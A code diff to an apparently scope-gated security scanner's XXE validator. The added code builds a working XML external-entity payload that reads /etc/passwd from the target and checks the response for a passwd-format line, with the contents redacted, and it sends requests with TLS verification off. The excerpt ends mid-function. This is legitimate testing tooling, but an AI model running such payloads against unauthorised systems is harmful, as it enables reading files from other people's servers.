@@ -12,6 +12,7 @@ Scope-gated; active (validators.active_enabled).
 """
 from __future__ import annotations
 
+import re
 from urllib.parse import urlsplit
 
 import httpx
@@ -41,6 +42,41 @@ def _payload(callback: str) -> str:
             '<probe>&xxe;</probe>')
 
 
+# In-band file-read proof. /etc/passwd is world-readable and contains no secrets
+# (password hashes live in the non-readable /etc/shadow); its `root:...:0:0:`
+# line is a strong, stable signature. Reading it is a non-destructive read that
+# also demonstrates the lab-class objective ("retrieve files") without touching
+# any application state.
+_FILE_URI = "file:///etc/passwd"
+_PASSWD_SIG = re.compile(r"root:[^:\n]*:0:0:", re.IGNORECASE)
+_LEAF_ELEMENT = re.compile(r"(<([A-Za-z_][\w.-]*)\s*>)([^<>]*)(</\2>)")
+
+
+def _inject_file_entity(body: str, file_uri: str = _FILE_URI) -> str:
+    """Turn a captured XML body into a file-reading XXE payload: declare a SYSTEM
+    entity for the file and substitute it into the first leaf element's text (the
+    value most apps echo back). Falls back to a minimal document when the captured
+    body has no usable element."""
+    body = (body or "").strip()
+    decl = ""
+    m = re.match(r"^\s*<\?xml[^>]*\?>", body)
+    if m:
+        decl = m.group(0)
+        rest = body[m.end():].lstrip()
+    else:
+        rest = body
+    root_m = re.search(r"<([A-Za-z_][\w.-]*)", rest)
+    root = root_m.group(1) if root_m else "probe"
+    doctype = f'<!DOCTYPE {root} [<!ENTITY xxe SYSTEM "{file_uri}">]>'
+    if root_m and _LEAF_ELEMENT.search(rest):
+        injected = _LEAF_ELEMENT.sub(r"\1&xxe;\4", rest, count=1)
+    else:
+        rest = f"<{root}>&xxe;</{root}>"
+        injected = rest
+    head = decl or '<?xml version="1.0"?>'
+    return f"{head}\n{doctype}\n{injected}"
+
+
 class XxeValidator(Validator):
     name = "xxe"
     finding_classes = {"xxe", "xml_external_entity", "xml_external_entities"}
@@ -67,12 +103,40 @@ class XxeValidator(Validator):
             return self._skip(f"host {host!r} out of scope")
         if not _looks_xml(exchange):
             return self._skip("endpoint does not take XML -- nothing to inject an external entity into")
-        collab = self.collab()
-        token = collab.token()
         headers = {k: v for k, v in (exchange.request_headers or {}).items()
                    if k.lower() not in ("host", "content-length")}
         headers.setdefault("Content-Type", "application/xml")
         method = (exchange.method or "POST").upper()
+
+        # 1) In-band file-read proof first: inject a SYSTEM entity for a
+        #    world-readable file and detect its signature reflected in the
+        #    response. Definitive, needs no collaborator, and is a read-only PoC.
+        try:
+            await global_throttle.acquire()
+            async with GatedAsyncClient(get_default_gate(), self.name, timeout=self.timeout,
+                                        follow_redirects=False, verify=False) as client:
+                resp = await client.request(
+                    method, exchange.url, headers=headers,
+                    content=_inject_file_entity(exchange.request_body or ""))
+        except SafetyGateBlocked:
+            return self._skip("mutating XML replay not authorized (set validators.allow_mutating_replay)")
+        except httpx.HTTPError as e:
+            return ValidationResult(self.name, "error", "xxe", summary=f"request failed: {e.__class__.__name__}")
+        if _PASSWD_SIG.search(resp.text or ""):
+            return ValidationResult(
+                self.name, "confirmed", "xxe", confidence=0.95, confirmed=True,
+                summary="XXE confirmed (in-band): the XML parser resolved a SYSTEM entity and read a "
+                        "local file, whose contents were reflected in the response.",
+                # Prove the read WITHOUT dumping the file: report only that the
+                # /etc/passwd-format signature appeared, never the file body.
+                evidence=(f"POSTed an XML document declaring `<!ENTITY xxe SYSTEM \"{_FILE_URI}\">` to "
+                          f"{exchange.url}; the response contained a /etc/passwd-format line "
+                          f"(matched `root:*:0:0:`), proving external-entity file retrieval. The file "
+                          f"contents are redacted here; the read is non-destructive."))
+
+        # 2) Out-of-band proof: catches BLIND XXE (no reflection) via a collaborator.
+        collab = self.collab()
+        token = collab.token()
         try:
             await global_throttle.acquire()
             # The XML POST is a mutating send -> route it through the safety gate
